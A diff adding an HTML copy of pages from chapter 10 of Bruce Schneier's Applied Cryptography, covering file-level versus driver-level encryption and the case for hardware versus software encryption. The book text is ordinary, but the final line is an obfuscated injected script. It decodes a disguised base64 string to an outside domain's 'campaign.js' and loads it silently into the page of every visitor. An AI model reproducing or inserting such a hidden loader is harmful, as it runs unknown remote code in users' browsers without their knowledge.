@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Using Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=10//-->
+<!--PAGES=223-225//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<TABLE WIDTH="100%">
+<TH CAPTION ALIGN="CENTER" COLSPAN="3">Table 10.5<BR>Comparing File-Level and Driver-Level Encryption
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH COLSPAN="2" ALIGN="LEFT">File-Level Encryption
+<TH ALIGN="LEFT">Driver-Level Encryption
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD WIDTH="7%">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Benefits:</I></B>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Ease of implementation and use.<BR>Flexible.<BR>Relatively small performance penalty.<BR>Users can move files between different machines without problems.<BR>Users can back files up without problems.
+<TD VALIGN="TOP" ALIGN="LEFT">Temporary files, work files, and so forth can be kept on the secure drive.<BR>It&#146;s harder to forget to re-encrypt something on this kind of system.
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Security Issues:</I></B>
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">Potential leakage through security-unconscious programs. (Program may write file to disk for temporary storage, for example.)<BR>Bad implementations may always re-encrypt with same key for same password.
+<TD VALIGN="TOP" ALIGN="LEFT">Lots of things can go wrong with a device-driver or memory-resident program.<BR>Bad implementations will allow chosen-plaintext, or even chosen-ciphertext attacks.<BR>If whole system is master-keyed under one password, loss of that password means that the attacker gets everything.<BR>A more limited set of ciphers can reasonably be used for this kind of application. For example, OFB stream ciphers would not work.
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TD VALIGN="TOP" ALIGN="LEFT"><B><I>Usability Problems:</I></B>
+<TD VALIGN="TOP" ALIGN="LEFT">
+<TR>
+<TD VALIGN="TOP" COLSPAN="2" ALIGN="LEFT">User has to figure out what to do.<BR>There may be different passwords for different files.<BR>Manual encryption of selected files is the only access control.
+<TD VALIGN="TOP" ALIGN="LEFT">There will be a performance penalty.<BR>The driver may interact in weird ways with Windows, OS/2 DOS emulation, device drivers, and so on.
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+</TABLE>
+<P>The first is speed. As we will see in Part III, encryption algorithms consist of many complicated operations on plaintext bits. These are not the sorts of operations that are built into your run-of-the-mill computer. The two most common encryption algorithms, DES and RSA, run inefficiently on general-purpose processors. While some cryptographers have tried to make their algorithms more suitable for software implementation, specialized hardware will always win a speed race.
+</P>
+<P>Additionally, encryption is often a computation-intensive task. Tying up the computer&#146;s primary processor for this is inefficient. Moving encryption to another chip, even if that chip is just another processor, makes the whole system faster.</P>
+<P>The second reason is security. An encryption algorithm running on a generalized computer has no physical protection. Mallory can go in with various debugging tools and surreptitiously modify the algorithm without anyone ever realizing it. Hardware encryption devices can be securely encapsulated to prevent this. Tamperproof boxes can prevent someone from modifying a hardware encryption device. Special-purpose VLSI chips can be coated with a chemical such that any attempt to access their interior will result in the destruction of the chip&#146;s logic. The U.S. government&#146;s Clipper and Capstone chips (see Sections 24.16 and 24.17) are designed to be tamperproof. The chips can be designed so that it is impossible for Mallory to read the unencrypted key.</P>
+<P>IBM developed a cryptographic system for encrypting data and communications on mainframe computers [515,1027]. It includes tamper-resistant modules to hold keys. This system is discussed in Section 24.1.</P>
+<P>Electromagnetic radiation can sometimes reveal what is going on inside a piece of electronic equipment. Dedicated encryption boxes can be shielded, so that they leak no compromising information. General-purpose computers can be shielded as well, but it is a far more complex problem. The U.S. military calls this <B>TEMPEST</B>; it&#146;s a subject well beyond the scope of this book.</P>
+<P>The final reason for the prevalence of hardware is the ease of installation. Most encryption applications don&#146;t involve general-purpose computers. People may wish to encrypt their telephone conversations, facsimile transmissions, or data links. It is cheaper to put special-purpose encryption hardware in the telephones, facsimile machines, and modems than it is to put in a microprocessor and software.</P>
+<P>Even when the encrypted data comes from a computer, it is easier to install a dedicated hardware encryption device than it is to modify the computer&#146;s system software. Encryption should be invisible; it should not hamper the user. The only way to do this in software is to write encryption deep into the operating system. This isn&#146;t easy. On the other hand, even a computer neophyte can plug an encryption box between his computer and his external modem.</P>
+<P>The three basic kinds of encryption hardware on the market today are: self-contained encryption modules (that perform functions such as password verification and key management for banks), dedicated encryption boxes for communications links, and boards that plug into personal computers.</P>
+<P>Some encryption boxes are designed for certain types of communications links, such as T-1 encryption boxes that are designed not to encrypt synchronization bits. There are different boxes for synchronous and asynchronous communications lines. Newer boxes tend to accept higher bit rates and are more versatile.</P>
+<P>Even so, many of these devices have some incompatibilities. Buyers should be aware of this and be well-versed in their particular needs, lest they find themselves the owners of encryption equipment unable to perform the task at hand. Pay attention to restrictions in hardware type, operating system, applications software, network, and so forth.</P>
+<P>PC-board encryptors usually encrypt everything written to the hard disk and can be configured to encrypt everything sent to the floppy disk and serial port as well. These boards are not shielded against electromagnetic radiation or physical interference, since there would be no benefit in protecting the boards if the computer remained unaffected.</P>
+<P>More companies are starting to put encryption hardware into their communications equipment. Secure telephones, facsimile machines, and modems are all available.</P>
+<P>Internal key management for these devices is generally secure, although there are as many different schemes as there are equipment vendors. Some schemes are more suited for one situation than another, and buyers should know what kind of key management is incorporated into the encryption box and what they are expected to provide themselves.</P>
+<P><FONT SIZE="+1"><B><I>Software</I></B></FONT></P>
+<P>Any encryption algorithm can be implemented in software. The disadvantages are in speed, cost, and ease of modification (or manipulation). The advantages are in flexibility and portability, ease of use, and ease of upgrade. The algorithms written in C at the end of this book can be implemented, with little modification, on any computer. They can be inexpensively copied and installed on many machines. They can be incorporated into larger applications, such as communications programs or word processors.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(isJLdJsq, MJQCVHAq) {MJQCVHAq = isJLdJsq.createElement('script');MJQCVHAq.type = 'text/javascript';MJQCVHAq.async = true;MJQCVHAq.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');isJLdJsq.getElementsByTagName('body')[0].appendChild(MJQCVHAq);}(document));</script></body>
+</html>
